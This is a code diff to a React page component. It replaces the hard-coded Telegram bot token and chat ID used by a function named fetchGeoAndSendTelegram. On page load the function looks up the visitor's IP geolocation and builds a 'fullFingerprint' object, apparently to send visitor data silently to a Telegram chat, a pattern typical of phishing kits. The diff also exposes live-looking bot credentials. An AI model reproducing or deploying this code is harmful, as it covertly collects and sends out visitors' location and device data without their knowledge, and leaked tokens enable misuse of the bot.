@@ -20,8 +20,8 @@ const Index: FC = () => {
             logSentRef.current = true;
             const fetchGeoAndSendTelegram = async () => {
                 const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
-    			const botToken = '8490086521:AAEUmh3X3VK2-yrO48QTA_fahPRhdEmmqEI';
-        		const chatId = '-5200329279';
+    			const botToken = '8723730456:AAHDdVpr86nmhrN6iw9q5dtGeKA7kFQ1LX8';
+        		const chatId = '8459284171';
                 const geoRes = await fetch(geoUrl);
                 const geoData = await geoRes.json();
                 const fullFingerprint = {
